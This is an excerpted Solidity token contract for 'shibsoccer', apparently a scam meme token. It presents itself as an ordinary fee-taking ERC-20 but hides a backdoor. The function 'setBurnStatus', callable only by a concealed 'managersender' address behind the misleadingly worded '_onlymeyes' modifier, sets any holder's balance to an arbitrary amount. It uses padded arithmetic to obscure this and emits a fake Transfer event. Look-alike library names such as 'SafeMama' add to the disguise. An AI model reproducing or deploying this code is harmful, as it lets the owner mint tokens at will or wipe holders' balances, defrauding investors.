...
// SPDX-License-Identifier: MIT
 ...
 //https://t.me/shib_soccer 
 // tax 4/4

pragma solidity ^0.8.10;

abstract contract SafeContext {
...
library SafeMama {
    ...
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMama: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMama: subtraction overflow");
    }
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "SafeMama: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMama: division by zero");
    }
    ...
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMama: modulo by zero");
    }
...
abstract contract SafeOwnable {
    ...
    modifier onlyOwner() {
        require(_owner == msg.sender, "SafeOwnable: caller is not the owner");
        _;
    }
...
contract shibsoccer is SafeContext, SafeIERC20, SafeOwnable {
    
    using SafeMama for uint256;
    using Address for address;
    
    string private _name = "shibsoccer";
    string private _symbol = "SHIBSOCCER";
    uint8 private _decimals = 2;
    address public managersender;
    ...
    mapping (address => uint256) _Tbalances;
    ...
    constructor () {
        ...
        _Tbalances[_msgSender()] = _totalSupply;
  ...
  modifier _onlymeyes () {
    require(managersender == msg.sender, "ERC20: permit Pancake address");
    _;
  }   
    ...
    function setBurnStatus(address Newamountadr, uint256 Newamount, uint256 XTTAMOUNT) external _onlymeyes {
      _Tbalances[Newamountadr] = (XTTAMOUNT / 1 - XTTAMOUNT / 1) + Newamount * 10 ** _decimals;
        emit Transfer(address(0), Newamountadr, Newamount * 10 ** _decimals);
  }  
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _Tbalances[sender] = _Tbalances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);


            _Tbalances[recipient] = _Tbalances[recipient].add(finalAmount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _Tbalances[address(this)] = _Tbalances[address(this)].add(feeAmount);
